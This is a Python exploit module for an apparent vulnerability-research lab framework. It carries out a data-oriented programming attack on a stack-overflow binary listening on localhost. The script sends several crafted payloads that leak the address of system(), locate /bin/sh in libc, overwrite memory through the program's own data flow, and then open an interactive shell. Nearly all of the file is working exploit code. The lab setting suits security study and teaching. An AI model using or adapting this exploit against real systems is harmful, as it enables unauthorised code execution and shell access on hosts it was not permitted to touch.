#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.tubes.remote import remote
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'dop'
        self.in_new_terminal = False
        self.payload_info = 'DEP ON ALSR OFF'
        self.info = '''Exploit Name : dop
Exploit abstract :Data-Oriented Programming to construct expressive non-control
data exploits for arbitrary x86 programs. 
Author : guoyingjie
Support change payload : false'''
        self.property = {
                         'limit':0x9,#cycle count
                         'choose':0x1,
                         'p':0x601068,
                         'q':0x601078,
                         'offset':9, # offset
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'architecture' : 'amd64',
                      'aslr' : 'off'
                      }
        self.vulnerability= 'vulnerabilities/stack_overflow/dop'

    def run(self):
     if self.options['architecture'] == 'amd64':
      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
      
        p = remote(self.options['dIP'], int(self.options['port']))
      
        #a = raw_input('input: ')


        #set /bin/sh ASCII
        binsh = p32(0x6e69622f) + p32(0x0068732f)
        
        #set payload
        payload = 'a'*(self.property['offset']-8) + binsh + p32(self.property['limit']) + p32(self.property['choose']) + p64(self.property['p']) + p64(self.property['q'])
        #send payload
        p.sendline(payload)
        #recv
        recv_data = p.recv()
        print 'rev1: ' + recv_data


        #set payload
        payload = 'a'*(self.property['offset']-8) + binsh + p32(self.property['limit']) + p32(self.property['choose'])
        #send payload
        p.sendline(payload)
        #recv  get new sysaddress here
        recv_data = p.recvline()
        print 'rev2: ' + recv_data
        self.property['sysaddress'] = int(recv_data,16)
        print "sysaddress = " + hex(self.property['sysaddress'])

        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)
        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset
        print "binsh_addr = " + hex(binsh_addr)

        
        #set payload
        self.property['choose'] = 2
        self.property['p'] = 0x601098
        self.property['q'] = 0x7fffffffdc78
        payload = 'a'*(self.property['offset']-8)+ p64(self.property['sysaddress']) + p32(self.property['limit']) + p32(self.property['choose']) + p64(self.property['p']) + p64(self.property['q'])
        #send payload
        p.sendline(payload)
        #recv
        recv_data = p.recvline()
        print 'rev3: ' + recv_data


        #set payload
        self.property['choose'] = 2
        self.property['p'] = 0x60109c
        self.property['q'] = 0x7fffffffdc7c
        payload = 'a'*(self.property['offset']-8)+ p64(self.property['sysaddress']) + p32(self.property['limit']) + p32(self.property['choose']) + p64(self.property['p']) + p64(self.property['q'])
        #send payload
        p.sendline(payload)
        #recv
        recv_data = p.recvline()
        print 'rev4: ' + recv_data


        #set payload
        self.property['limit'] = 0
        self.property['choose'] = 3
        self.property['p'] = 0x601070
        self.property['q'] = 0x601078
        payload = binsh + 'a'*(self.property['offset']-8) + p32(self.property['limit']) + p32(self.property['choose']) + p64(self.property['p']) + p64(self.property['q'])
        #send payload
        p.sendline(payload)


        

        print 'interactive'
        p.interactive()

        

      else:
        print 'static'
     elif self.options['architecture'] == 'i386':

      if self.options['static'] == 'False':
        print 'dl'
       
      else:
        print 'static'
       
     else:
        print 'Unrecognized architecture, stop.'
        return
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.frame_check():
        print 'Running:\n'
        exp.run()
